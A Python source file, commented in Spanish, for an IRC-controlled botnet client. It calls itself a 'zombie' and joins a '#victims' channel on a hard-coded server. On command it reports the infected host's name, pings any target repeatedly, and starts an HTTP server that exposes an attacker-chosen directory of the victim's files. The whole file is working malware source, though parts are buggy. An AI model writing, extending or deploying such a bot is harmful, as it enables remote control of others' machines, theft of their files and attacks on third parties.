from re import A
import socket, os, subprocess, platform, multiprocessing
from time import sleep

def ftpPath(cmd, sock, channel): 
    if (platform.system().lower()=='windows'):
        try:
            treePath, port = cmd.split()[1:2] #[0] -> Path, [1] -> Puerto
            command = ['python','-m','http.server','--directory',treePath, port]
            sock.send(("PRIVMSG " + channel + " :"+"Iniciando servidor en la ruta " + treePath + "....."+'\r'+'\n').encode('utf-8'))
            sleep(1)
            subprocess.call(command)
        except:
            pass
    
def callPing(host, sock, channel):
    param = '-n' if platform.system().lower()=='windows' else '-c'
    argArray = host.split() #[0] -> IP, [1] -> número de veces
    command = ['ping', param, '1', argArray[0]]
    if(int(argArray[1])>1):
        sock.send(("PRIVMSG " + channel + " :"+"Realiando ping a " + argArray[0] + " " + argArray[1] + " veces....."+'\r'+'\n').encode('utf-8'))
    elif(int(argArray[1])==1):
        sock.send(("PRIVMSG " + channel + " :"+"Realizando ping a " + argArray[0] + " una vez....."+'\r'+'\n').encode('utf-8'))
    else:
        return
    for i in range(int(argArray[1])):
        print(i)
        subprocess.call(command)
    return 

def getOS(): # Consulta el hostname del zombie
    if (platform.system().lower()=='linux'):
        command = ['cat','/proc/sys/kernel/hostname']
    elif (platform.system().lower()=='windows'):
        command = ['hostname']
    return subprocess.check_output(command)

# Datos de conexión al servidor IRC
server = "192.168.0.19"
port = 6667
channel = "#victims"
zombieNickname = os.environ.get('USERNAME')

# Conexión a canal de IRC
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(bytes("NICK " + zombieNickname + "\r\n", "UTF-8"))
    s.send(bytes("USER " + zombieNickname + " " + zombieNickname + " " + zombieNickname + " :victima\r\n", "UTF-8"))
    s.send(bytes("JOIN " + channel + "\r\n", "UTF-8"))
except:
    print("No se pudo establecer comunicación con el canal de IRC")
    exit

while True:
    # Se buscan nuevos mensajes en el canal
    sleep(0.3)
    try:
        r = s.recv(1024).decode("UTF-8")
        r = r.strip("\r\n")
        print(r) # Imprimir lo que se muestra en el canal
    except Exception:
        pass

    # Diferentes mensajes que se pueden recibir
    if r.find("PING") != -1:
        s.send(("PONG " + r.split()[1] + "\r\n").encode('UTF-8'))
        print("PONG")
    if r.lower().find(":@saludar") != -1:
        s.send(("PRIVMSG " + channel +" :hello there!\r\n" ).encode('UTF-8'))
    if r.lower().find("@name") != -1:  
        osVal = getOS()
        osVal = osVal.decode('utf-8')
        s.send(("PRIVMSG " + channel +" :" + osVal + "\r\n").encode('UTF-8'))
    if r.lower().find(":@ping") != -1:
        cmd = r.lower()[r.lower().find(":@ping")+7:len(str(r))];
        callPing(cmd, s, channel)
    if r.find('@ftpPath') != -1:
        cmd = r[r.find(":@ftpPath")+10:len(str(r))];
        #cmd = r.lower()[r.lower().find(":@ftpPath")+61:len(str(r))];
        print(cmd)
        print(zombieNickname)
        if cmd.split()[0] == zombieNickname:
            print("Preparando proceso...")
            p = multiprocessing.Process(target=ftpPath, name="Foo", args=(cmd,s,channel))
            p.start();sleep(10);p.terminate(); p.join
            s.send(("PRIVMSG " + channel +" :goodbye!\r\n" ).encode('UTF-8'))
            #ftpPath(cmd, s, channel)
    if r.lower().find(":@exit") != -1:
        s.send(("PRIVMSG " + channel +" :goodbye!\r\n" ).encode('UTF-8'))
        sleep(1)
        s.shutdown(socket.SHUT_RDWR)
        exit